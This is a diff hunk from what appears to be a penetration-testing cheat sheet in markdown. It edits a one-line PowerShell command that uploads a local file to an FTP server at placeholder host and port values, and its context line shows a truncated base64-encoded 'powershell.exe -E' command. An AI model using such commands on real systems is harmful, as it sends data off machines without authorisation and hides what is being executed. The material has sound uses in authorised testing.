@@ -851,7 +851,7 @@ powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAH
 
 **Upload a file to an FTP server**
 ```PowerShell
-$ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://<IP>:<PORT>/<FILE_TO_UPLOAD>"); $ftpRequest.Credentials = New-Object System.Net.NetworkCredential("<USERNAME>", "<PASSWORD>"); $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile; $fileContents = [System.IO.File]::ReadAllBytes((Resolve-Path "test.zip")); $ftpRequest.ContentLength = $fileContents.Length; $requestStream = $ftpRequest.GetRequestStream(); $requestStream.Write($fileContents, 0, $fileContents.Length); $requestStream.Close(); $response = $ftpRequest.GetResponse(); $response.Close()
+$ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://<IP>:<PORT>/<FILE_TO_UPLOAD>"); $ftpRequest.Credentials = New-Object System.Net.NetworkCredential("<USERNAME>", "<PASSWORD>"); $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile; $fileContents = [System.IO.File]::ReadAllBytes((Resolve-Path "<FILE_TO_UPLOAD>")); $ftpRequest.ContentLength = $fileContents.Length; $requestStream = $ftpRequest.GetRequestStream(); $requestStream.Write($fileContents, 0, $fileContents.Length); $requestStream.Close(); $response = $ftpRequest.GetResponse(); $response.Close()
 ```
 - Change `<IP>`, `<PORT>`, `<FILE_TO_UPLOAD>`, `<USERNAME>`, `<PASSWORD>`
 
